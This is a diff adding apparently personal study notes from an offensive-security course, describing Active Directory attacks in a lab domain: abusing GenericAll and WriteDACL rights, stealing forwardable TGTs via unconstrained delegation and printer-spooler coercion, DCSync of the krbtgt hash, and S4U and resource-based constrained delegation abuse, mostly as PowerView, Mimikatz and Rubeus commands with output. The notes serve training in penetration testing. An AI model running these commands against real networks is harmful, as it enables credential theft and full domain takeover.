@@ -3859,3 +3859,624 @@ After reloading our .bashrc file as we did before with source, we can run the cp
 ```bash
 sudo cp /etc/passwd /tmp/testpasswd
 ```
+
+# Linux Lateral Movement
+
+# Windows Credentials
+
+# Windows Lateral Movement
+
+# Microsoft SQL Attacks
+
+# Active Directory Exploitation
+
+## AD Object Security Permissions
+
+Within Active Directory, access to an object is controlled through a Discretionary Access Control List (DACL), which consists of a series of Access Control Entries (ACE).
+
+Each ACE defines whether access to the object is allowed or denied, which entity the ACE applies to, and the type of access.
+
+Note: When multiple ACE's are present, their order is important. If a deny ACE comes before an allow ACE, the deny takes precedence, since the first match principle applies.
+
+An ACE is stored according to the Security Descriptor Definition Language (SDDL):
+
+`ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid`
+
+E.g., `(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0)`
+
+1. ace_type: designates whether the ACE allows or denies permissions.
+2. ace_flags: set flags related to inheritance on child objects.
+3. access rights applied by the ACE
+4. object_guid and inherit_object_guid allows the ACE to apply to only specific objects as provided by the GUID values.
+5. account_sid: the SID of the object that the ACE applies to.
+
+E.g., the ACE on object A applies to object B. This grants or denies object B access to object A with the specified access rights.
+
+A = ACCESS_ALLOWED_ACE_TYPE
+
+Access rights:
+RP = ADS_RIGHT_DS_READ_PROP
+WP = ADS_RIGHT_DS_WRITE_PROP
+CC = ADS_RIGHT_DS_CREATE_CHILD
+DC = ADS_RIGHT_DS_DELETE_CHILD
+LC = ADS_RIGHT_ACTRL_DS_LIST
+SW = ADS_RIGHT_DS_SELF
+RC = READ_CONTROL
+WD = WRITE_DAC
+WO = WRITE_OWNER
+GA = GENERIC_ALL
+
+Ace Sid: 
+S-1-1-0
+
+=> we control the object given by the ACE SID, we obtain the **WRITE_DAC, WRITE_OWNER, and GENERIC_ALL** access rights among others.
+
+=> improperly configured DACLs can lead to compromise of user accounts, domain groups, or even computers.
+
+enumerate the DACLs.
+
+All authenticated domain users can read AD objects (such as users, computers, and groups) and their DACLs.
+
+Enumerate weak ACL configurations from a compromised low-privilege domain user account.
+
+```pwsh
+. .\powerview.ps1
+Get-ObjectAcl -Identity offsec
+```
+
+```
+ActiveDirectoryRights: ReadProperty
+SecurityIdentifier: <SecurityIdentifier>
+AceType: AccessAllowedObject
+```
+
+The output tells us that the AD object identified by the <SecurityIdentifier> SID has ReadProperty access rights to the Offsec user. 
+
+```pwsh
+ConvertFrom-SID <SecurityIdentifier>
+```
+
+```pwsh
+Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
+```
+
+```
+AceType: AccessAllowed
+ActiveDirectoryRights: GenericAll
+Identity: PROD\Domain Admins
+```
+
+members of the Domain Admins group have the GenericAll access right, which equates to the file access equivalent of Full Control.
+
+### Abusing GenericAll
+
+The GenericAll access right gives full control of the targeted object.
+
+Enumerate all domain users that our current account has GenericAll rights to.
+
+1. Gather all domain users with PowerView's `Get-DomainUser` method and pipe the output into Get-ObjectAcl. This will enumerate all ACEs for all domain users.
+2. Resolve the SID, add it to the output
+3. Filter on usernames that match our current user as set in the `$env:UserDomain` and `$env:Username` environment variables
+
+```pwsh
+Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+```
+
+```
+AceType               : AccessAllowed
+ObjectDN              : CN=TestService1,OU=prodUsers,DC=prod,DC=corp1,DC=com
+ActiveDirectoryRights : GenericAll
+...
+Identity              : PROD\offsec
+```
+
+Some applications (like Exchange or SharePoint) require seemingly excessive access rights to their associated service accounts.
+
+The GenericAll access right gives us full control over the TestService1 user => change the password of the account without knowledge of the old password
+
+```pwsh
+net user testservice1 h4x /domain
+```
+
+Once we reset the password, we can either log in to a computer with the account or create a process in the context of that user to perform a pass-the-ticket attack.
+
+We can also abuse the **ForceChangePassword** and **AllExtendedRights** access rights to change the password of a user account in a similar way without supplying the old password.
+
+Since everything in Active Directory is an object, these concepts also apply to groups.
+
+Enumerate all domain groups that our current user has explicit access rights to by piping the output of `Get-DomainGroup` into Get-ObjectAcl and filtering it, in a process similar to the previous user account enumeration:
+
+```pwsh
+Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+```
+
+```
+AceType               : AccessAllowed
+ObjectDN              : CN=TestGroup,OU=prodGroups,DC=prod,DC=corp1,DC=com
+ActiveDirectoryRights : GenericAll
+...
+Identity              : PROD\offsec
+```
+
+```pwsh
+net group testgroup offsec /add /domain
+```
+
+As with user accounts, we can also use the **AllExtendedRights** and **GenericWrite** access rights in a similar way.
+
+### Abusing WriteDACL
+
+All Active Directory objects have a DACL and one object access right in particular (WriteDACL) grants permission to modify the DACL itself. 
+
+Enumerate misconfigured user accounts with Get-DomainUser and Get-ObjectAcl:
+
+```pwsh
+Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+```
+
+```
+AceType               : AccessAllowed
+ObjectDN              : CN=TestService2,OU=prodUsers,DC=prod,DC=corp1,DC=com
+ActiveDirectoryRights : ReadProperty, GenericExecute, WriteDacl
+Identity              : PROD\offsec
+```
+
+Our current user has WriteDACL access rights to the TestService2 user, which allows us to add new access rights like GenericAll.
+
+Use the **Add-DomainObjectAcl** PowerView method to apply additional access rights such as GenericAll, GenericWrite, or even DCSync if the targeted object is the domain object.
+
+Add the GenericAll access right to the TestService2 object:
+
+```pwsh
+Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
+```
+
+Add-DomainObjectAcl will modify the current ACE if an entry already exists.
+
+```pwsh
+net user testservice2 h4x /domain
+```
+
+The WriteDACL access right is just as powerful as GenericAll.
+
+Although enumerating access rights for our current user is beneficial, we can also map out all access rights to locate other user accounts or groups that can lead to compromise.
+
+Perform against a large network relatively easily with the BloodHound, PowerShell script or its C# counterpart SharpHound.
+
+These tools enumerate all domain attack paths including users, groups, computers, GPOs, and misconfigured access rights.
+
+We can also leverage the BloodHound JavaScript web application6 locally to visually display prospective attack paths, which is essential during a penetration test against large Active Directory infrastructures.
+
+## Kerberos Delegation
+
+E.g., An internal web server application that is only available to company employees, uses Windows Authentication and retrieves data from a backend database. The web application should only be able to access data from the database server if the user accessing the web application has appropriate access according to Active Directory group membership.
+
+When the web application uses Kerberos authentication, it is only presented with the user's service ticket. This service ticket contains access permissions for the web application, but the web server service account can not use it to access the backend database. => the **Kerberos double-hop issue**.
+
+*Kerberos delegation* solves this design issue and provides a way for the web server to authenticate to the backend database on behalf of the user.
+
+Several implementations include **unconstrained delegation**, **constrained delegation**, and **resource based constrained delegation**.
+
+Resource-based constrained delegation requires a domain functional level of 2012.
+
+### Unconstrained Delegation
+
+When a user successfully logs in to a computer, a Ticket Granting Ticket (TGT) is returned. Once the user requests access to a service that uses Kerberos authentication, a Ticket Granting Service ticket (TGS) is generated by the Key Distribution Center (KDC) based on the TGT and returned to the user.
+
+This TGS is then sent to the service, which validates the access.
+
+Since the service cannot reuse the TGS to authenticate to a backend service, any Kerberos authentication stops here.
+
+Unconstrained delegation solves this with a **forwardable TGT**.
+When the user requests access for a service ticket against a service that uses unconstrained delegation, the request also includes a forwardable TGT.
+ 
+The KDC returns a **TGT with the forward flag set** along with a session key for that TGT and a regular TGS. The user's client embeds the TGT and the session key into the TGS and sends it to the service, which can now impersonate the user to the backend service.
+
+Since the frontend service receives a forwardable TGT, it can perform authentication on behalf of the user to any service, not just the intended backend service.
+
+=> If we succeed in **compromising the web server service** and a user authenticates to it, we can steal the user's TGT and authenticate to any service.
+
+The Domain Controller stores the information about computers configured with unconstrained delegation and makes this information available for all authenticated users.
+
+The information is stored in the **userAccountControl** property as **TRUSTED_FOR_DELEGATION**.
+
+From the Windows 10 client as the Offsec domain user:
+
+```pwsh
+Get-DomainComputer -Unconstrained
+```
+
+```
+distinguishedname                        : CN=APPSRV01,OU=prodComputers,DC=prod,DC=corp1,DC=com
+samaccountname                           : APPSRV01$
+samaccounttype                           : MACHINE_ACCOUNT
+objectcategory                           : CN=Computer,CN=Schema,CN=Configuration,DC=corp1,DC=com
+serviceprincipalname                     : {TERMSRV/APPSRV01, TERMSRV/APPSRV01.prod.corp1.com,
+                                           WSMAN/APPSRV01, WSMAN/APPSRV01.prod.corp1.com...}
+useraccountcontrol                       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+name                                     : APPSRV01
+dnshostname                              : APPSRV01.prod.corp1.com
+```
+
+The appsrv01 machine is configured with unconstrained delegation.
+
+**Service accounts** can also be configured with unconstrained delegation if the application executes in the context of the service account rather than the **machine account**.
+
+When unconstrained delegation is operating normally, the **service account** hosting the application can freely make use of the forwarded tickets it receives from users. => if we compromise the service account, we can exploit unconstrained delegation **without needing local administrative privileges**.
+
+To abuse unconstrained delegation, we must first compromise the computer or service account.
+
+Finding IP address of appsrv01
+
+```pwsh
+nslookup appsrv01
+```
+
+We must perform lateral movement onto appsrv01
+
+=> Log in to appsrv01 as the Offsec user instead, which is local administrator on the target system.
+
+Extract the TGTs supplied by users to IIS.
+
+```
+privilege::debug
+sekurlsa::tickets
+```
+
+We find TGTs and TGSs related to the Offsec user along with the computer account, but no other domain users.
+
+Typically, a machine would only be configured with unconstrained delegation because it hosts an application that requires it, e.g., an IIS-hosted web site
+
+We can either wait for a user to connect or leverage an internal phishing attack to solicit visits.
+
+=> Log in to the Windows 10 client as the admin domain user and browsing to http://appsrv01.
+
+Since the web application is configured with Windows authentication, the Kerberos protocol is used.
+
+Switch back to appsrv01:
+
+```
+sekurlsa::tickets
+```
+
+Find a TGT for the admin user and it is flagged as **forwardable**. 
+
+Dump it to disk and then inject the TGT contents from the output file into our process:
+
+```
+sekurlsa::tickets /export
+kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi
+exit
+```
+
+```pwsh
+C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd
+```
+
+We have achieved code execution on the domain controller since the admin user is a member of the Domain Admins group.
+
+By default, all users allow their TGT to be delegated, but privileged users can be added to the **Protected Users** group, which blocks delegation. This will also break the functionality of the application that required unconstrained delegation for those users.
+
+### I Am a Domain Controller
+
+We relied on a privileged user accessing the target application.
+
+> Force a high-privileged authentication without any user interaction.
+
+SpoolSample tool is designed to force a Domain Controller to connect back to a system configured with unconstrained delegation. => allows the attacker to steal a TGT for the domain controller computer account.
+
+The RPC interface we leveraged locally is indeed also accessible over the network through TCP port 445 if the host firewall allows it.
+
+TCP port 445 is typically open on Windows servers, including domain controllers, and the print spooler service runs automatically at startup in the context of the computer account.
+
+The print spooler service must be running and available on the domain controller from appsrv01.
+
+Log in to appsrv01 as the Offsec user and attempt to access the named pipe (only works on pwsh)
+
+```pwsh
+dir \\cdc01\pipe\spoolss
+```
+
+When the "target" spooler accesses the named pipe on the "attacking" machine, it will present a forwardable TGT along with the TGS if the "attacking" machine is configured with unconstrained delegation.
+
+Use SpoolSample to facilitate the attack. Once the authentication has taken place, we'll look for tickets in memory originating from the domain controller machine account.
+
+In the last section, we used Mimikatz to find and extract the forwardable TGT. In addition, we had to write the TGT to disk to reuse it.
+
+=> Rubeus C# application
+
+From an administrative command prompt:
+
+```bat
+Rubeus.exe monitor /interval:5 /filteruser:CDC01$ /nowrap
+```
+
+Open a second command prompt and trigger the print spooler change notification by specifying the target machine and capture server.
+
+```bat
+SpoolSample.exe CDC01 APPSRV01
+```
+
+It may be necessary to run the tool multiple times before the change notification callback takes place.
+
+Switch back to Rubeus, which displays the TGT for the domain controller account:
+
+```
+[*] 4/13/2020 2:45:16 PM UTC - Found new TGT:
+
+  User                  :  CDC01$@PROD.CORP1.COM
+  ...
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFIjCCBR6gAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEF...
+
+[*] Ticket cache size: 1
+```
+
+We have forced the domain controller machine account to authenticate to us and give us a TGT.
+
+**krbrelayx**, a Python implementation of this technique. It does not require execution of Rubeus and Spoolsample on the compromised host as it will execute on the Kali machine.
+
+=> Improve this technique by avoiding the write to disk.
+
+Rubeus monitor outputs the Base64-encoded TGT but it can also inject the ticket into memory with the ptt command:
+
+```bat
+Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
+```
+
+With the TGT of the domain controller machine account injected into memory, we can perform actions in the context of that TGT.
+
+The CDC01$ account is not a local administrator on the domain controller so we cannot directly perform lateral movement with it.
+
+But it has **domain replication permissions** => perform dcsync and dump the password hash of any user, including the special krbtgt account:
+
+```
+lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+```
+
+Craft a golden ticket and obtain access to any resource in the domain.
+
+Alternatively, we can dump the password hash of a member of the Domain Admins group.
+
+We can also use the DLL implementation [Rubeus-Rundll32](https://github.com/rvrsh3ll/Rubeus-Rundll32) which may help bypass application whitelisting.
+
+### Constrained Delegation
+
+While unconstrained delegation allowed the service to perform authentication to anything in the domain, constrained delegation **limits the delegation scope**.
+
+Since the Kerberos protocol does not natively support constrained delegation by default, Microsoft released two extensions for this feature: S4U2Self and S4U2Proxy.
+
+Constrained delegation is configured on the **computer or user object**. It is set through the **msds-allowedtodelegateto** property by specifying the SPNs the current object is allowed constrained delegation against.
+
+```pwsh
+Get-DomainUser -TrustedToAuth
+```
+
+```
+distinguishedname        : CN=IISSvc,OU=prodUsers,DC=prod,DC=corp1,DC=com
+userprincipalname        : IISSvc@prod.corp1.com
+samaccountname           : IISSvc
+samaccounttype           : USER_OBJECT
+msds-allowedtodelegateto : {MSSQLSvc/CDC01.prod.corp1.com:SQLEXPRESS,
+                           MSSQLSvc/cdc01.prod.corp1.com:1433}
+objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=corp1,DC=com
+serviceprincipalname     : HTTP/web
+useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
+```
+
+Constrained delegation is configured for the IISSvc account. It is a service account for a web server running IIS.
+
+The **msds-allowedtodelegateto** property contains the SPN of the MS SQL server on CDC01. => constrained delegation is only allowed to that SQL server.
+
+TRUSTED_TO_AUTH_FOR_DELEGATION value in the useraccountcontrol property is set. This value is used to indicate whether constrained delegation can be used if the authentication between the user and the service uses a different authentication mechanism like NTLM.
+
+**S4U2Self** extension:
+ 
+If a **frontend** service does not use Kerberos authentication and the backend service does, it needs to be able to request a TGS to the frontend service from a KDC on behalf of the user who is authenticating against it. The S4U2Self extension enables this if the TRUSTED_TO_AUTH_FOR_DELEGATION value is present in the useraccountcontrol property. Additionally, the frontend service can do this without requiring the password or the hash of the user.
+
+=> If we compromise the IISSvc account, we can request a service ticket to IIS for any user in the domain, including a domain administrator.
+
+**S4U2proxy** extension requests a service ticket for the **backend** service on behalf of a user. This extension depends on the service ticket obtained either through S4U2Self or directly from a user authentication via Kerberos.
+
+If Kerberos is used for authentication to the frontend service, S4U2Proxy can use a forwardable TGS supplied by the user.
+
+=> Similarly to our initial attack that leveraged unconstrained delegation, we would require user interaction.
+
+This extension allows IISSvc to request a service ticket to any of the services listed as SPNs in the msds-allowedtodelegateto field.
+
+It would use the TGS obtained through the S4USelf extension and submit it as a part of the S4UProxy request for the backend service.
+
+Once this service ticket request is made and the ticket is returned by the KDC, IISSvc can perform authentication to that specific service on that specific host.
+
+If we compromise the IISSvc account, we can request a service ticket for the services listed in the msds-allowedtodelegateto field as any user in the domain. Depending on the type of service, this may lead to code execution.
+
+Simulate a compromise of the IISSvc account and abuse that to gain access to the MSSQL instance on CDC01.
+
+=> Rubeus, which includes S4U extension support.
+
+Kekeo by Mimikatz also provides access to S4U extension abuse.
+
+Note that we do not need to execute in the context of the IISSvc account in order to exploit the account. We only need the password hash.
+
+However, if we only have the clear text password, we can generate the NTLM hash with Rubeus:
+
+```pwsh
+.\Rubeus.exe hash /password:lab
+```
+
+use Rubeus to generate a TGT for IISSvc
+
+```pwsh
+.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /nowrap
+```
+
+Invoke the S4U extensions.
+
+The username we want to impersonate (/impersonateuser), the administrator account of the domain
+
+```pwsh
+.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
+```
+
+We obtained a usable service ticket for the MSSQL service instance on CDC01.
+
+Validate that we are authenticated to MSSQL as the impersonated user:
+
+```pwsh
+.\SQL.exe
+```
+
+We have logged in to the MSSQL instance as the domain administrator.
+
+By compromising an account that has constrained delegation enabled, we can gain access to all the services configured through the msDS-AllowedToDelegateTo property. If the **TRUSTED_TO_AUTH_FOR_DELEGATION** value is set, we can do this **without user interaction**.
+
+Interestingly, when the TGS is returned from the KDC, the server name is encrypted, but not the service name.
+
+=> Modify the service name within the TGS in memory and obtain access to a different service on the same host.
+
+Attempt to gain access to the CIFS service:
+
+```pwsh
+.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt
+```
+
+This TGS should yield access to the file system and potentially direct code execution. Unfortunately, the SPN for the MSSQL server ends with ":1433", which is not usable for CIFS since it requires an SPN with the format `CIFS/cdc01.prod.corp1.com`.
+
+If the SPN configured for constrained delegation only uses the service and host name like www/cdc01.prod.corp1.com, we could modify the TGS to access any service on the system.
+
+### Resource-Based Constrained Delegation
+
+Constrained delegation works by configuring SPNs on the frontend service under the **msDS-AllowedToDelegateTo** property. Configuring constrained delegation requires the **SeEnableDelegationPrivilege** privilege on the domain controller, which is typically only enabled for Domain Admins.
+
+Resource-based constrained delegation (RBCD) is meant to remove the requirement of highly elevated access rights like **SeEnableDelegationPrivilege** from system administrators.
+
+The **msDS-AllowedToActOnBehalfOfOtherIdentity** property controls delegation **from the backend service**. To configure RBCD, the SID of the frontend service is written to the new property of the backend service.
+
+RBCD can typically be configured by the backend service administrator instead.
+
+Once RBCD has been configured, the frontend service can use S4U2Self to request the forwardable TGS for any user to itself followed by S4U2Proxy to create a TGS for that user to the backend service.
+
+Unlike constrained delegation, under RBCD the KDC checks if the SID of the frontend service is present in the msDS-AllowedToActOnBehalfOfOtherIdentity property of the backend service.
+
+**The frontend service must have an SPN set** in the domain. A user account typically does not have an SPN set but all computer accounts do.
+
+=> Any attack against RBCD needs to happen from a **computer account or a service account with a SPN**.
+
+The same attack against constrained delegation applies to RBCD if we can compromise a frontend service that has its SID configured in the msDS-AllowedToActOnBehalfOfOtherIdentity property of a backend service.
+
+E.g., A RBCD attack that leads to code execution on appsrv01.
+
+Starts by compromising a domain account that has the **GenericWrite** access right on a computer account object.
+
+```pwsh
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+```
+
+```
+AceType               : AccessAllowed
+ObjectDN              : CN=APPSRV01,OU=prodComputers,DC=prod,DC=corp1,DC=com
+ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
+Identity              : PROD\dave
+```
+
+The dave user has GenericWrite to appsrv01.
+
+We can update any non-protected property on that object, including **msDS-AllowedToActOnBehalfOfOtherIdentity** and add the SID of a different computer.
+
+Once a SID is added, we will act in the context of that computer account and we can execute the S4U2Self and S4U2Proxy extensions to obtain a TGS for appsrv01.
+
+We either have to obtain the password hash of a computer account or simply create a new computer account object with a selected password.
+
+By default, any authenticated user can add up to 10 computer accounts to the domain and they will have SPNs set automatically. This value is present in the ms-DS-MachineAccountQuota property in the Active Directory domain object.
+
+Enumerate ms-DS-MachineAccountQuota
+
+```pwsh
+Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
+```
+
+Normally, the computer account object is created when a physical computer is joined to the domain. We can simply create the object itself with the New-MachineAccount method of the Powermad.ps1 PowerShell script.
+
+```pwsh
+. .\powermad.ps1
+
+New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
+
+Get-DomainComputer -Identity myComputer
+```
+
+The msDS-AllowedToActOnBehalfOfOtherIdentity property stores the SID as part of a security descriptor in a binary format. We must convert the SID of our newly-created computer object to the correct format in order to proceed with the attack.
+
+Create a new security descriptor with the correct SID. In the beginning of this module, we determined that the SID is the last portion of a security descriptor string so we can reuse a working string, replacing only the SID.
+
+Fortunately, security researchers have discovered a valid security descriptor string that we can use as shown in Listing 37. We can use the RawSecurityDescriptor class to instantiate a SecurityDescriptor object:
+
+```pwsh
+$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
+
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
+```
+
+With the SecurityDescriptor object created, we must convert it into a byte array to match the format for the msDS-AllowedToActOnBehalfOfOtherIdentity property:
+
+```pwsh
+$SDbytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDbytes,0)
+```
+
+Obtain a handle to the computer object for appsrv01 and then pipe that into Set-DomainObject, which can update properties by specifying them with -Set options (Setting msds-allowedtoactonbehalfofotheridentity)
+
+```pwsh
+Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+
+Since our dave user has the GenericWrite access right to appsrv01, we can set this property.
+
+We can also use this attack vector with GenericAll, WriteProperty, or WriteDACL access rights to appsrv01.
+
+After writing the SecurityDescriptor to the property field, we should verify it
+
+```pwsh
+$RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
+
+$Descriptor.DiscretionaryAcl
+```
+
+Verifying the SID in the SecurityDescriptor
+
+```pwsh
+ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-2101
+```
+
+The SecurityDescriptor was indeed set correctly in the msDS-AllowedToActOnBehalfOfOtherIdentity property for appsrv01.
+Now we can begin our attack in an attempt to compromise appsrv01. We'll start by obtaining the hash of the computer account password with Rubeus:
+
+```pwsh
+.\Rubeus.exe hash /password:h4x
+```
+
+In the previous section, we used the Rubeus asktgt command to request a TGT before invoking the s4u command. We can also directly submit the username and password hash to the s4u command, which will implicitly call asktgt and inject the resultant TGT, after which the S4U extensions will be invoked:
+
+```
+.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
+```
+
+After obtaining the TGT for the myComputer machine account, S4U2Self will then request a forwardable service ticket as the administrator user to the myComputer computer account.
+Finally, S4U2Proxy is invoked to request a TGS for the CIFS service on appsrv01 as the administrator user, after which it is injected into memory.
+To check the success of this attack, we'll first dump any loaded Kerberos tickets with klist:
+
+```pwsh
+klist
+```
+
+Now that we have a TGS for the CIFS service on appsrv01 as administrator, we can interact with file services on appsrv01 in the context of the administrator domain admin user:
+
+```pwsh
+dir \\appsrv01.prod.corp1.com\c$
+```
+
+Our access to appsrv01 is in the context of the administrator domain admin user. We can use our CIFS access to obtain code execution on appsrv01, but in the process we will perform a network login instead of an interactive login. => our access will be limited to appsrv01 and cannot directly be used to expand access towards the rest of the domain.
